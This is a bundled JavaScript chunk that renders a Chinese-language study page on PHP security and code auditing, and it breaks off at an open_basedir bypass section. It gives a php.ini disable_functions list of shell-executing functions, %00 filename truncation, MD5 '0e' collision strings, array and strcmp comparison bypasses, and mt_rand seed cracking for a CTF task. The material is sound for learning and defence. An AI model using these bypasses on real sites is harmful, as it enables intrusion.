(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[41],{183:function(e,a,n){"use strict";n.r(a),function(e){n.d(a,"default",(function(){return i}));var t,s=n(95),p=(n(139),n(0),n(96));function c(){return(c=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var n=arguments[a];for(var t in n)Object.prototype.hasOwnProperty.call(n,t)&&(e[t]=n[t])}return e}).apply(this,arguments)}function b(e,a){if(null==e)return{};var n,t,s=function(e,a){if(null==e)return{};var n,t,s={},p=Object.keys(e);for(t=0;t<p.length;t++)n=p[t],a.indexOf(n)>=0||(s[n]=e[n]);return s}(e,a);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(t=0;t<p.length;t++)n=p[t],a.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}(t="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&t(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var o,r,m=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(p.b)("div",a)}},N={},l="wrapper";function i(e){var a=e.components,n=b(e,["components"]);return Object(p.b)(l,c({},N,n,{components:a,mdxType:"MDXLayout"}),Object(p.b)("h1",{className:"__internal",id:"php安全相关"},"PHP安全相关",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h1",{className:"__internal",id:"何为代码审计？"},"何为代码审计？",Object(p.b)("a",c({parentName:"h1"},{href:"#%E4%BD%95%E4%B8%BA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。"),Object(p.b)("p",null,"内容包括："),Object(p.b)("blockquote",null,Object(p.b)("ol",{parentName:"blockquote"},Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"前后台分离的运行架构"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"Web服务的目录权限分类"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"认证会话与应用平台的结合"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"数据库的配置规范"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"SQL语句的编写规范"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"Web服务的权限配置"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"对抗爬虫引擎的处理措施"))),Object(p.b)("h1",{className:"__internal",id:"你审计的关键点？"},"你审计的关键点？",Object(p.b)("a",c({parentName:"h1"},{href:"#%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},Object(p.b)("strong",{parentName:"p"},"！！！首先要搞清楚目录结构，程序有哪些功能，查看 config 配置文件！！！")),Object(p.b)("p",{parentName:"blockquote"},"一、如果是CMS，搜索公开漏洞，对比同版本文件差异"),Object(p.b)("p",{parentName:"blockquote"},"二、查看敏感函数、回溯变量，判断变量在调用前是否经过安全过滤"),Object(p.b)("p",{parentName:"blockquote"},"三、查看公共函数、过滤函数是否存在漏洞和可绕过的点"),Object(p.b)("p",{parentName:"blockquote"},"​\t\t函数命名上会包含",Object(p.b)("inlineCode",{parentName:"p"},"common"),"、",Object(p.b)("inlineCode",{parentName:"p"},"function"),"、",Object(p.b)("inlineCode",{parentName:"p"},"filter"),"、",Object(p.b)("inlineCode",{parentName:"p"},"safe"),"、",Object(p.b)("inlineCode",{parentName:"p"},"check"),"等关键词"),Object(p.b)("p",{parentName:"blockquote"},"四、查看敏感功能点，正向追踪变量传递过程，重点关注用户可控变量")),Object(p.b)("h1",{className:"__internal",id:"参考链接"},Object(p.b)("a",c({parentName:"h1"},{href:"https://wooyun.js.org/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html",target:"_blank"}),"参考链接"),Object(p.b)("a",c({parentName:"h1"},{href:"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h1",{className:"__internal",id:"你用什么工具提高效率？"},"你用什么工具提高效率？",Object(p.b)("a",c({parentName:"h1"},{href:"#%E4%BD%A0%E7%94%A8%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E6%8F%90%E9%AB%98%E6%95%88%E7%8E%87%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"Fortify"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"submile代码审计插件")),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/5alt/VulHint",target:"_blank"}),"VulHint")),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/WangYihang/Find-PHP-Vulnerabilities",target:"_blank"}),"Find-PHP-Vulnerabilities")," "),Object(p.b)("h1",{className:"__internal",id:"为什么有的时候没有错误回显，用php举例"},"为什么有的时候没有错误回显，用php举例",Object(p.b)("a",c({parentName:"h1"},{href:"#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E7%9A%84%E6%97%B6%E5%80%99%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE%EF%BC%8C%E7%94%A8php%E4%B8%BE%E4%BE%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。 "),Object(p.b)("p",{parentName:"blockquote"},"在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用 "),Object(p.b)("p",{parentName:"blockquote"},"除了上面的，还可以在执行语句前面添加@ ")),Object(p.b)("h1",{className:"__internal",id:"phpini可以设置哪些安全特性"},"php.ini可以设置哪些安全特性",Object(p.b)("a",c({parentName:"h1"},{href:"#phpini%E5%8F%AF%E4%BB%A5%E8%AE%BE%E7%BD%AE%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"关闭错误回显"},Object(p.b)("strong",{parentName:"h3"},"关闭错误回显"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E5%85%B3%E9%97%AD%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"防止利用错误信息反馈获取网站敏感信息"),Object(p.b)("h3",{className:"__internal",id:"设置open_basedir-varwwwhtml"},Object(p.b)("strong",{parentName:"h3"},"设置open_basedir"),"= /var/www/html",Object(p.b)("a",c({parentName:"h3"},{href:"#%E8%AE%BE%E7%BD%AEopen_basedir-varwwwhtml","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"限制 PHP 脚本能访问的目录，一定程度下可降低Webshell的危害"),Object(p.b)("h3",{className:"__internal",id:"禁用危险函数"},Object(p.b)("strong",{parentName:"h3"},"禁用危险函数"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E7%A6%81%E7%94%A8%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"如果不希望执行包括",Object(p.b)("inlineCode",{parentName:"p"},"system()"),"等在内的执行命令的 PHP 函数"),Object(p.b)("p",null,"以及能够查看 PHP 信息的",Object(p.b)("inlineCode",{parentName:"p"},"phpinfo()"),"等函数"),Object(p.b)("p",null,"可以通过以下设置禁止这些函数"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"disable_functions ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," phpinfo",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," system",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," passthru",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," exec",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," shell_exec",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," popen",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," escapeshellarg",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," escapeshellcmd",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," proc_close",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," proc_open",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," dl"))),Object(p.b)("h3",{className:"__internal",id:"打开magic_quotes_gpc魔术引号"},Object(p.b)("strong",{parentName:"h3"},"打开magic_quotes_gpc魔术引号"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E6%89%93%E5%BC%80magic_quotes_gpc%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"magic_quotes_gpc ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," on"))),Object(p.b)("p",null,"魔术引号自动过滤 GET/POST/COOKIE 可以防止SQL注入"),Object(p.b)("p",null,"但是 php<5.4不会处理$_SERVER(client-ip/referer注入)  详情参见",Object(p.b)("a",c({parentName:"p"},{href:"https://www.seebug.org/vuldb/ssvid-30102",target:"_blank"}),"CVE-2012-0831")),Object(p.b)("h3",{className:"__internal",id:"关闭注册全局变量"},Object(p.b)("strong",{parentName:"h3"},"关闭注册全局变量"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E5%85%B3%E9%97%AD%E6%B3%A8%E5%86%8C%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"在 PHP 环境中提交的变量，包括使用 POST 或者 GET 命令提交的变量"),Object(p.b)("p",null,"都将自动注册为全局变量，能够被直接访问 (PHP<5.4.0)。"),Object(p.b)("p",null,"这对服务器是非常不安全的，应该将注册全局变量的选项关闭，禁止将所提交的变量注册为全局变量。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"register_globals ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," off"))),Object(p.b)("h3",{className:"__internal",id:"关闭-php-版本信息在-http-头中的泄露"},Object(p.b)("strong",{parentName:"h3"},"关闭 PHP 版本信息在 HTTP 头中的泄露"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E5%85%B3%E9%97%AD-php-%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%E5%9C%A8-http-%E5%A4%B4%E4%B8%AD%E7%9A%84%E6%B3%84%E9%9C%B2","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"为了防止黑客获取服务器中 PHP 版本的信息，可以禁止该信息在 HTTP 头部内容中泄露"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"expose_php ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," off"))),Object(p.b)("h3",{className:"__internal",id:"错误信息控制"},Object(p.b)("strong",{parentName:"h3"},"错误信息控制"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E6%8E%A7%E5%88%B6","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"一般 PHP 环境在没有连接到数据库或者其他情况下会有错误提示信息"),Object(p.b)("p",null,"错误信息中可能包含 PHP 脚本当前的路径信息或者查询的 SQL 语句等信息"),Object(p.b)("p",null,"这类信息如果暴露给黑客是不安全的，应该禁止该错误提示："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"display_errors ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," Off"))),Object(p.b)("p",null,"如果确实要显示错误信息，一定要设置显示错误信息的级别。"),Object(p.b)("p",null,"例如，只显示警告以上的错误信息："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"error_reporting ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"E_WARNING")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&")," ",Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"E_ERROR")))),Object(p.b)("h3",{className:"__internal",id:"错误日志"},Object(p.b)("strong",{parentName:"h3"},"错误日志"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"建议在关闭错误提示信息后，对于错误信息进行记录，便于排查服务器运行异常的原因："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"log_errors ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," On"))),Object(p.b)("p",null,"同时，需要设置错误日志存放的目录，将 PHP 错误日志与 Apache 的日志存放在同一目录下："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"error_log = /usr/local/apache2/logs/php_error.log"))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"注意"),"： 该文件必须设置允许 Apache 用户或用户组具有写的权限。"),Object(p.b)("h1",{className:"__internal",id:"php的-00-截断的原理是什么？"},"PHP的 %00 截断的原理是什么？",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E7%9A%84-00-%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},Object(p.b)("inlineCode",{parentName:"strong"},"存在于 < 5.3.4版本"),"，GPC关闭"),"，一般利用在对文件进行操作时，如文件上传时文件名的截断"),Object(p.b)("p",null,"如",Object(p.b)("inlineCode",{parentName:"p"},"filename=test.php%00.txt")," 会被截断成test.php，00后面的被忽略"),Object(p.b)("p",null,"系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了"),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"因为PHP使用C语言编写，C语言的字符串结束标志是字符 ",Object(p.b)("inlineCode",{parentName:"p"},"\\0")," ，它的ASCII码值是 0")),Object(p.b)("h1",{className:"__internal",id:"php弱类型"},"PHP弱类型",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E5%BC%B1%E7%B1%BB%E5%9E%8B","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"如果用",Object(p.b)("inlineCode",{parentName:"p"},"=="),"比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行"),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"0e"),"开头的字符串等于0"),Object(p.b)("p",null,"进行比较运算时，如果遇到了",Object(p.b)("inlineCode",{parentName:"p"},"0e\\d+"),"这种字符串，就会将这种字符串解析为科学计数法  "),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"0e开头的MD5和原字符串（用于MD5碰撞）")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"s878926199a\n0e545993274517709034328855841020\n\ns155964671a\n0e342768416822451524974117254469\n\ns214587387a\n0e848240448830537924465865611904"))),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),"?kekeyy1",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),"xxx",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),"kekeyy2",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"123")))),Object(p.b)("p",null,"md5()函数无法处理数组，如果传入的为数组，会返回NULL"),Object(p.b)("p",null,"所以两个数组经过加密后得到的都是NULL,也就是相等的"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"值为NULL的MD5：")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e"))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"strcmp()："),"需要给strcmp()传递2个string类型的参数"),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"如果str1小于str2,返回-1，相等返回0，否则返回1"),Object(p.b)("p",{parentName:"blockquote"},"strcmp比较出错 => 返回NULL => NULL==0 => get flag!")),Object(p.b)("h1",{className:"__internal",id:"变量覆盖"},"变量覆盖",Object(p.b)("a",c({parentName:"h1"},{href:"#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"$$容易引发变量覆盖")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"$GLOBALS — 引用全局作用域中可用的全部变量\t\t(PHP手册)")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$args"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token constant"}),"GLOBALS")," 和 ",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"var_dump"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$$args"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," 前面那个 $ 组成 ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$GLOBALS")))),Object(p.b)("h1",{className:"__internal",id:"php伪随机数爆破"},"PHP伪随机数爆破",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种"),Object(p.b)("p",{parentName:"blockquote"},"PHP的mt_rand()函数生成的随机数只跟seed和调用该函数的次数有关。")),Object(p.b)("p",null,"当得到seed数值后，就可以预测出接下来的数值是多少，这是该函数的一个问题，它并不能起到一个真随机数的作用"),Object(p.b)("p",null,"seed获取需要利用一个爆破工具：",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank"}),"https"),Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank"}),"://github.com/"),Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank"}),"lepiaf"),Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank"}),"/"),Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/lepiaf/php_mt_seed",target:"_blank"}),"php_mt_seed")),Object(p.b)("h2",{className:"__internal",id:"例题："},"例题：",Object(p.b)("a",c({parentName:"h2"},{href:"#%E4%BE%8B%E9%A2%98%EF%BC%9A","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"把题目给的生成的一组随机数的第一个数用作爆破"),Object(p.b)("p",null,"可能爆破出来多个种子，自己本地测试下"),Object(p.b)("p",null,"题目：srand.php"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"PHP 7.x"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_srand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),"xxxxxxxx",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token shell-comment comment"}),"# We can't tell you what is xxxxxxxx!"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br/>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"echo flag{"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"mt_rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"}"'),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n984489752\n619387123\n2070958802\n2105559368\n1909473866\n1679323715\n1910332168\n640569646\n1103001695\n1871111424\nflag\n\nSo, Please guess the flag!"))),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),"./php_mt_seed ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"984489752")))),Object(p.b)("h1",{className:"__internal",id:"绕过open_basedir列目录"},"绕过Open_basedir列目录",Object(p.b)("a",c({parentName:"h1"},{href:"#%E7%BB%95%E8%BF%87open_basedir%E5%88%97%E7%9B%AE%E5%BD%95","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"1、system命令执行函数绕过"},"1、system命令执行函数绕过",Object(p.b)("a",c({parentName:"h3"},{href:"#1%E3%80%81system%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"}," open_basedir 